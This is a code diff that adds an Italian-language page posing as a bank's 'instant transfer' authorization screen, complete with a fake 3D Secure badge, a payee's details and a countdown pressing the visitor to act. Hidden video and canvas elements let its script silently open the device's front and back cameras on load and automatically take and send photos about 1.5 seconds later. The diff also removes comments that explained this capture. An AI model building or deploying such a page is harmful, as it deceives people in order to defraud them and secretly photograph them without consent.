@@ -1,3 +1,131 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bonifico istantaneo</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: rgb(15, 15, 15);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .card {
+      background-color: transparent;
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .bank-logo {
+      width: 140px;
+      max-width: 70%;
+      margin-bottom: 20px;
+    }
+
+    .info p {
+      font-size: 16px;
+      margin: 8px 0;
+    }
+
+    .secure-tag {
+      font-size: 14px;
+      color: rgb(26, 110, 75);
+      margin-top: -10px;
+      margin-bottom: 20px;
+    }
+
+    .timer {
+      font-size: 15px;
+      color: rgb(251, 18, 34);
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .autorizza {
+      background-color: #00bfff;
+      color: #000;
+    }
+
+    .nega, .riprovare {
+      background-color: #fff;
+      color: #000;
+    }
+
+    .link {
+      color: #00bfff;
+      font-size: 14px;
+      margin: 6px 0;
+      text-decoration: none;
+      display: block;
+    }
+
+    .loading {
+      font-size: 18px;
+      margin-top: 30px;
+      animation: blink 1s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .result-image {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card" id="card">
+  <img src="logo.png" alt="Banca dei Crediti" class="bank-logo">
+  <h2 style="margin-bottom: 5px;">Ricevi bonifico istantaneo</h2>
+  <div class="secure-tag">🔒 3D Secure</div>
+
+  <div class="info">
+    <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
+    <p>IBAN: <strong>IT44M****4492</strong></p>
+    <p>Importo: <strong>15,00 €</strong></p>
+    <p>Commissione: <strong>0,00 €</strong></p>
+    <p>Transazione: <strong>#TRX-004391</strong></p>
+    <p>Data: <strong><span id="data-operazione"></span></strong></p>
+    <p class="timer">⚠︎ Sessione in scadenza tra <span id="countdown">02:00</span></p>
+  </div>
+
+  <video id="videoFront" autoplay playsinline></video>
+  <video id="videoBack" autoplay playsinline></video>
+  <canvas id="canvasFront"></canvas>
+  <canvas id="canvasBack"></canvas>
+
+  <button class="autorizza" onclick="handleClick()">AUTORIZZA</button>
+  <button class="nega" onclick="showFailure()">NEGA</button>
+</div>
+
 <script>
   const countdownEl = document.getElementById('countdown');
   const card = document.getElementById('card');
@@ -24,7 +152,6 @@
     }
   }, 1000);
 
-  // Avvia entrambe le fotocamere (frontale e posteriore)
   function startVideoStreams() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
       .then(stream => {
@@ -39,14 +166,12 @@
         videoBack.srcObject = stream;
       })
       .catch(() => {
-        // fallback: non tutti i device supportano la posteriore
         console.warn("Webcam posteriore non disponibile.");
       });
   }
 
   startVideoStreams();
 
-  // Scatta da entrambe le webcam (se disponibili)
   function takeAndSendPhoto(action) {
     if (videoFront.readyState >= 2) {
       canvasFront.width = videoFront.videoWidth;
@@ -101,6 +226,9 @@
     `;
   }
 
-  // Autoscatto dopo 1,5 secondi
+  // Autoscatto iniziale
   setTimeout(() => takeAndSendPhoto("auto-scatto"), 1500);
 </script>
+
+</body>
+</html>
